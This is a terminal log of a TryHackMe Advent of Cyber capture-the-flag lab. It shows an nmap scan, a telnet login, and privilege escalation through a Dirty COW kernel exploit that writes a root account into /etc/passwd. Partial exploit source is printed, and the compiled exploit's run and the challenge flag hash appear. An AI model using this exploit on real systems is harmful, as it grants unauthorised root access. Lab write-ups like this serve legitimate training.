
┌──(kali㉿kali)-[~/GitHub/TryHackMe/AdventOfCyber2]            
└─$ nmap 10.10.61.124                                          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 08:40 EDT                                                               
Nmap scan report for 10.10.61.124                              
Host is up (0.099s latency).                                   
Not shown: 997 closed ports                                    
PORT    STATE SERVICE                                          
22/tcp  open  ssh                                              
23/tcp  open  telnet                                           
111/tcp open  rpcbind                                          

Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds   

┌──(kali㉿kali)-[~/GitHub/TryHackMe/AdventOfCyber2]            
└─$ telnet 10.10.61.124 23                                     
Trying 10.10.61.124...                                         
Connected to 10.10.61.124.                                     
Escape character is '^]'.                                      
HI SANTA!!!                                                    

We knew you were coming and we wanted to make                  
it easy to drop off presents, so we created                    
an account for you to use.                                     

Username: santa                                                
Password: clauschristmas                                       

We left you cookies and milk!                                  

christmas login: santa                                         
Password:                                                      
Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2                                                               
                \ /                                            
              -->*<--                                          
                /o\                                            
               /_\_\                                           
              /_/_0_\                                          
             /_o_\_\_\                                         
            /_/_/_/_/o\                                        
           /@\_\_\@\_\_\                                       
          /_/_/O/_/_/_/_\                                      
         /_\_\_\_\_\o\_\_\                                     
        /_/0/_/_/_0_/_/@/_\                                    
       /_\_\_\_\_\_\_\_\_\_\                                   
      /_/o/_/_/@/_/_/o/_/0/_\                                  
               [___]                                           
                                                               
$ uname -a                                                     
Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux                   
$ cat /etc/*release                                            
DISTRIB_ID=Ubuntu                                              
DISTRIB_RELEASE=12.04                                          
DISTRIB_CODENAME=precise                                       
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"                         
$ ls                                                           
christmas.sh  cookies_and_milk.txt                             
$ cat cookies_and_milk.txt                                     
/*************************************************             
// HAHA! Too bad Santa! I, the Grinch, got here                
// before you did! I helped myself to some of                  
// the goodies here, but you can still enjoy                   
// some half eaten cookies and this leftover                   
// milk! Why dont you try and refill it yourself!              
//   - Yours Truly,                                            
//         The Grinch                                          
//*************************************************/           

#include <fcntl.h>                                             
#include <pthread.h>                                           
#include <string.h>                                            
#include <stdio.h>                                             
#include <stdint.h>                                            
#include <sys/mman.h>                                          
#include <sys/types.h>                                         
#include <sys/stat.h>                                          
#include <sys/wait.h>                                          
#include <sys/ptrace.h>                                        
#include <stdlib.h>                                            
#include <unistd.h>                                            
#include <crypt.h>                                             

const char *filename = "/etc/passwd";                          
const char *backup_filename = "/tmp/passwd.bak";               
const char *salt = "grinch";                                   

int f;                                                         
void *map;                                                     
pid_t pid;                                                     
pthread_t pth;                                                 
struct stat st;                                                

struct Userinfo {                                              
   char *username;                                             
   char *hash;                                                 
   int user_id;                                                
   int group_id;                                               
   char *info;                                                 
   char *home_dir;                                             
   char *shell;                                                
};                                                             

char *generate_password_hash(char *plaintext_pw) {             
  return crypt(plaintext_pw, salt);                            
}                                                              

char *generate_passwd_line(struct Userinfo u) {                
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";               
  int size = snprintf(NULL, 0, format, u.username, u.hash,     
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);       
  char *ret = malloc(size + 1);                                
  sprintf(ret, format, u.username, u.hash, u.user_id,          
    u.group_id, u.info, u.home_dir, u.shell);                  
  return ret;                                                  
}                                                              

void *madviseThread(void *arg) {                               
  int i, c = 0;                                                
  for(i = 0; i < 200000000; i++) {                             
    c += madvise(map, 100, MADV_DONTNEED);                     
  }                                                            
  printf("madvise %d\n\n", c);                                 
}                                                              

int copy_file(const char *from, const char *to) {              
  // check if target file already exists                       
  if(access(to, F_OK) != -1) {                                 
    printf("File %s already exists! Please delete it and run again\n",                                                        
      to);                                                     
    return -1;                                                 
  }                                                            

  char ch;                                                     
  FILE *source, *target;                                       

  source = fopen(from, "r");                                   
  if(source == NULL) {                                         
    return -1;                                                 
  }                                                            
  target = fopen(to, "w");                                     
  if(target == NULL) {                                         
     fclose(source);                                           
     return -1;                                                
  }                                                            

  while((ch = fgetc(source)) != EOF) {                         
     fputc(ch, target);                                        
   }                                                           

  printf("%s successfully backed up to %s\n",                  
    from, to);                                                 

  fclose(source);                                              
  fclose(target);                                              

  return 0;                                                    
}                                                              

int main(int argc, char *argv[])                               
{                                                              
  // backup file                                               
  int ret = copy_file(filename, backup_filename);              
  if (ret != 0) {                                              
    exit(ret);                                                 
  }                                                            

  struct Userinfo user;                                        
  // set values, change as needed                              
  user.username = "grinch";                                    
  user.user_id = 0;                                            
  user.group_id = 0;                                           
  user.info = "pwned";                                         
  user.home_dir = "/root";                                     
  user.shell = "/bin/bash";                                    

}                                                              

/*************************************************             
// HAHA! Too bad Santa! I, the Grinch, got here                
// before you did! I helped myself to some of                  
// the goodies here, but you can still enjoy                   
// some half eaten cookies and this leftover                   
// milk! Why dont you try and refill it yourself!              
//   - Yours Truly,                                            
//         The Grinch                                          
//*************************************************/           
$ nano dirty.c                                                                                                                
$ gcc -pthread dirty.c -o dirty -lcrypt                        
$ ./dirty                                                      
/etc/passwd successfully backed up to /tmp/passwd.bak          
Please enter the new password:                                 
Complete line:                                                 
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash               

mmap: 7f559fde3000                                             
^C                                                             
$ su firefart                                                  
Password:                                                      
firefart@christmas:/home/santa# ls                             
christmas.sh  cookies_and_milk.txt  dirty  dirty.c             
firefart@christmas:/home/santa# cd /root                       
firefart@christmas:~# ls                                       
christmas.sh  message_from_the_grinch.txt                      
firefart@christmas:~# cat message_from_the_grinch.txt          
Nice work, Santa!                                              

Wow, this house sure was DIRTY!                                
I think they deserve coal for Christmas, don't you?            
So let's leave some coal under the Christmas `tree`!           

Let's work together on this. Leave this text file here,        
and leave the christmas.sh script here too...                  
but, create a file named `coal` in this directory!             
Then, inside this directory, pipe the output                   
of the `tree` command into the `md5sum` command.               

The output of that command (the hash itself) is                
the flag you can submit to complete this task                  
for the Advent of Cyber!                                       

        - Yours,                                               
                John Hammond                                   
                er, sorry, I mean, the Grinch                  

          - THE GRINCH, SERIOUSLY                              

firefart@christmas:~# touch coal                               
firefart@christmas:~# tree | md5sum                                                                                                                                                                                                                          
8b16f00dd3b51efadb02c1df7f8427cc  -                            
firefart@christmas:~#                                          
Broadcast message from firefart@christmas                      
        (unknown) at 16:54 ...                                 

The system is going down for power off NOW!                    
Connection closed by foreign host.                             

┌──(kali㉿kali)-[~/GitHub/TryHackMe/AdventOfCyber2]            
└─$                                                            
